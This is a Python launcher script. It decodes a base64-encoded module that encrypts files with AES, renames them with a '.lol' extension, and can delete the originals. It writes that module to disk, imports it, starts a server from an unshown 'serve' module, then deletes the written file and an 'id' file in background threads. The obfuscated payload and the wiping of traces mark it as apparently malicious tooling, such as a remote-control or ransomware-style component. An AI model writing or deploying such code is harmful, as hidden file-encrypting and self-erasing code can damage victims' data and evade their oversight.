from threading import Thread
import base64
import sys 
import os 

PY_VER = int(sys.version[0])


def create_utils():
	i = 'ZnJvbSBDcnlwdG8uUmFuZG9tIGltcG9ydCBnZXRfcmFuZG9tX2J5dGVzCmZyb20gQ3J5cHRvLkNp'\
		'cGhlciBpbXBvcnQgQUVTCmltcG9ydCBiYXNlNjQKaW1wb3J0IHNvY2tldAppbXBvcnQgc3lzCmlt'\
		'cG9ydCBvcwoKCkJTWj0xNjtQQUQ9J3snCnBhZD1sYW1iZGEgczogcyArIChCU1ogLSBsZW4ocykg'\
		'JSBCU1opKlBBRApFbmNvZGVBRVMgPSBsYW1iZGEgYywgczogYmFzZTY0LmI2NGVuY29kZShjLmVu'\
		'Y3J5cHQocGFkKHMpKSkKRGVjb2RlQUVTID0gbGFtYmRhIGMsIGU6IGMuZGVjcnlwdChiYXNlNjQu'\
		'YjY0ZGVjb2RlKGUpKS5yc3RyaXAoUEFEKQoKZGVmIGZlbmNyeXB0KGZuYW1lLGRlc3Ryb3kpOgoJ'\
		'aWYgbm90IG9zLnBhdGguaXNmaWxlKGZuYW1lKToKCQlleGl0KCkKCWVmaWxlPWZuYW1lLnNwbGl0'\
		'KCcvJylbLTFdLnNwbGl0KCcuJylbMF0rJy5sb2wnCgljb250ZW50PW9wZW4oZm5hbWUsJ3JiJyku'\
		'cmVhZCgpCglrPWdldF9yYW5kb21fYnl0ZXMoMTYpO29wZW4oZWZpbGUsJ3diJykud3JpdGUoRW5j'\
		'b2RlQUVTKEFFUy5uZXcoayksY29udGVudCkpCglvcGVuKGZuYW1lLnNwbGl0KCcvJylbLTFdLnNw'\
		'bGl0KCcuJylbMF0rJy5rZXknLCd3YicpLndyaXRlKGJhc2U2NC5iNjRlbmNvZGUoaykpCglpZiBk'\
		'ZXN0cm95OgoJCW9zLnJlbW92ZShmbmFtZSkKCmRlZiBmZGVjcnlwdChmbmFtZSk6CgllbmNkPW9w'\
		'ZW4oZm5hbWUsJ3JiJykucmVhZCgpCglrZj1mbmFtZS5zcGxpdCgnLicpWzBdKycua2V5JwoJaz1i'\
		'YXNlNjQuYjY0ZGVjb2RlKG9wZW4oa2YsJ3JiJykucmVhZCgpKQoJcmV0dXJuIERlY29kZUFFUyhB'\
		'RVMubmV3KGspLGVuY2QpCg=='
	if PY_VER <3:
		open('utils.py', 'wb').write(base64.b64decode(i))

def cleanup(files):
	for f in files: Thread(target=os.remove, args=(f,)).start()

def main():
	PY_VER = int(sys.version[0])

	# Create UTILS 
	create_utils()
	import utils

	# start the server 
	import serve 
	serve.Server().run()

	# cleanup extra files
	cleanup(['utils.py', 'id'])

if __name__ == '__main__':
	main()

